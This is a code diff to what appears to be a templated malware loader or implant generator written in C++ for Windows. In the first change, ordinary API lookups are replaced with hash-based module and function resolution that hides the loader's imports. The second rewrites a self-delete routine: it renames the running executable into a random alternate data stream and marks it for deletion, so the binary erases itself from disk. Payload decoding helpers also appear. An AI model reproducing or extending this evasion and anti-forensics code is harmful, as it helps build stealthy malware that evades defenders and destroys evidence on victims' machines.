@@ -222,10 +222,10 @@ static bool decompress_lz4(const uint8_t* src, size_t src_len,
 static bool decompress_lznt(const uint8_t* src, size_t src_len,
                             uint8_t* dst, size_t dst_cap, size_t* dst_len) {
     using RtlDecompressBuffer_t = LONG(NTAPI*)(USHORT, PUCHAR, ULONG, PUCHAR, ULONG, PULONG);
-    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+    HMODULE hNtdll = resolve_module(HASHA("NTDLL.DLL"));
     if (!hNtdll) return false;
     auto pRDB = reinterpret_cast<RtlDecompressBuffer_t>(
-        GetProcAddress(hNtdll, obf("RtlDecompressBuffer")));
+        resolve_function(hNtdll, HASHA("RtlDecompressBuffer")));
     if (!pRDB) return false;
     ULONG final_size = 0;
     LONG status = pRDB(0x0002, dst, static_cast<ULONG>(dst_cap),
@@ -362,52 +362,68 @@ static size_t decode_uuid(const char* src, size_t src_len, uint8_t* dst) {
 }
 {{#ENDIF}}
 
-// Self-delete via ADS rename + FILE_DISPOSITION_INFO (Jonas Lyk technique)
+// Self-delete via ADS rename + FILE_DISPOSITION_INFO + delete-on-close reopen
 {{#IF SELF_DELETE}}
 static void self_delete() {
-    wchar_t path[MAX_PATH];
-    GetModuleFileNameW(NULL, path, MAX_PATH);
+    WCHAR path[MAX_PATH * 2] = { 0 };
+    WCHAR new_stream[MAX_PATH] = { 0 };
 
-    // Step 1: open with DELETE, rename the default :$DATA stream to an ADS
-    HANDLE hFile = CreateFileW(path, DELETE | SYNCHRONIZE, 0, NULL, OPEN_EXISTING,
-                               FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) return;
+    PFILE_RENAME_INFO     pRename     = NULL;
+    FILE_DISPOSITION_INFO disposition = { TRUE };
 
-    // Use FileRenameInfoEx (65) with POSIX semantics so the rename succeeds
-    // on a running executable. Flags: REPLACE_IF_EXISTS (1) | POSIX_SEMANTICS (2)
-    typedef struct {
-        ULONG Flags;
-        HANDLE RootDirectory;
-        ULONG FileNameLength;
-        WCHAR FileName[1];
-    } FILE_RENAME_INFO_EX;
+    HANDLE hFile      = INVALID_HANDLE_VALUE;
+    SIZE_T sizeStream = 0;
+    SIZE_T sizeRename = 0;
 
-    const wchar_t new_stream[] = L":deadbeef";
-    size_t name_bytes = sizeof(new_stream);
-    size_t info_size = offsetof(FILE_RENAME_INFO_EX, FileName) + name_bytes;
-    auto* info = (FILE_RENAME_INFO_EX*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, info_size);
-    if (!info) { CloseHandle(hFile); return; }
+    DWORD tick = GetTickCount();
+    const WCHAR hex[] = L"0123456789abcdef";
+    new_stream[0] = L':';
+    for (int i = 0; i < 8; i++)
+        new_stream[1 + i] = hex[(tick >> (28 - i * 4)) & 0xF];
+    tick *= 0x41C64E6D;
+    for (int i = 0; i < 8; i++)
+        new_stream[9 + i] = hex[(tick >> (28 - i * 4)) & 0xF];
+    new_stream[17] = L'\0';
 
-    info->Flags = 0x00000001 | 0x00000002; // REPLACE_IF_EXISTS | POSIX_SEMANTICS
-    info->RootDirectory = NULL;
-    info->FileNameLength = (ULONG)(name_bytes - sizeof(WCHAR));
-    memcpy(info->FileName, new_stream, name_bytes);
+    if (!GetModuleFileNameW(NULL, path, MAX_PATH))
+        return;
 
-    BOOL ok = SetFileInformationByHandle(hFile,
-        (FILE_INFO_BY_HANDLE_CLASS)65, // FileRenameInfoEx
-        info, (DWORD)info_size);
+    hFile = CreateFileW(path, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    if (hFile == INVALID_HANDLE_VALUE)
+        return;
+
+    sizeStream = wcslen(new_stream) * sizeof(WCHAR);
+    sizeRename = sizeof(FILE_RENAME_INFO) + sizeStream;
+    pRename = (PFILE_RENAME_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeRename);
+    if (!pRename) {
+        CloseHandle(hFile);
+        return;
+    }
+
+    pRename->FileNameLength  = (DWORD)sizeStream;
+    pRename->ReplaceIfExists = FALSE;
+    pRename->RootDirectory   = NULL;
+    memcpy(pRename->FileName, new_stream, sizeStream);
+
+    if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRename, (DWORD)sizeRename)) {
+        HeapFree(GetProcessHeap(), 0, pRename);
+        CloseHandle(hFile);
+        return;
+    }
+
+    if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &disposition, sizeof(disposition))) {
+        HeapFree(GetProcessHeap(), 0, pRename);
+        CloseHandle(hFile);
+        return;
+    }
+
     CloseHandle(hFile);
-    HeapFree(GetProcessHeap(), 0, info);
-    if (!ok) return;
 
-    // Step 2: reopen and mark for delete-on-close via FILE_DISPOSITION_INFO
-    hFile = CreateFileW(path, DELETE | SYNCHRONIZE, 0, NULL, OPEN_EXISTING,
-                        FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) return;
+    hFile = CreateFileW(path, DELETE | SYNCHRONIZE, FILE_SHARE_READ | FILE_SHARE_DELETE,
+                        NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
+    if (hFile != INVALID_HANDLE_VALUE)
+        CloseHandle(hFile);
 
-    FILE_DISPOSITION_INFO disp = {};
-    disp.DeleteFile = TRUE;
-    SetFileInformationByHandle(hFile, FileDispositionInfo, &disp, sizeof(disp));
-    CloseHandle(hFile);
+    HeapFree(GetProcessHeap(), 0, pRename);
 }
 {{#ENDIF}}
